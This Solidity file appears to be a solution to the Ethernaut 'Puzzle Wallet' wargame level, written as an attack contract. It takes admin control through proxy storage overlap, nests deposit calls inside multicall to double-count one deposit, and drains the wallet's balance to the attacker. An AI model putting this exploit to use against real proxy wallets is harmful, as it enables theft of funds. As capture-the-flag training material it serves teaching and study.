// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface IPuzzleWallet {
    function setMaxBalance(uint256) external;
    function addToWhitelist(address) external;
    function deposit() external payable;
    function execute(address, uint256, bytes calldata) external payable;
    function multicall(bytes[] calldata) external payable;
    function proposeNewAdmin(address) external;
    function approveNewAdmin(address) external;
    function upgradeTo(address) external;
}

contract PuzzleWalletAttack {
    IPuzzleWallet public ethernautInstance;
    address public myAddress;

    // Deploy the contract and make yourself the owner
    constructor(address instanceAddress) payable {
        myAddress = msg.sender;
        ethernautInstance = IPuzzleWallet(instanceAddress);
        ethernautInstance.proposeNewAdmin(address(this));
    }


    function attack() public {
        // Add yourself to the whitelist.
        ethernautInstance.addToWhitelist(address(this));

        // Find the data to call the multicall and call it.
        // This will call deposit first and call the multicall again.
        bytes[] memory dataToDeposit = new bytes[](1);
        dataToDeposit[0] = abi.encodeWithSignature("deposit()");
        bytes[] memory dataToMulticall = new bytes[](2);
        dataToMulticall[0] = dataToDeposit[0];
        dataToMulticall[1] = abi.encodeWithSignature("multicall(bytes[])", dataToDeposit);
        ethernautInstance.multicall{value: 0.01 ether}(dataToMulticall);

        // Call the execute function and send balance to myAddress
        ethernautInstance.execute(myAddress, address(ethernautInstance).balance, "");

        uint256 x = uint256(uint160(myAddress));
        ethernautInstance.setMaxBalance(x);

    }

    function selfDestruct() external {
        selfdestruct(payable(myAddress)); 
    }

    receive() external payable {}
}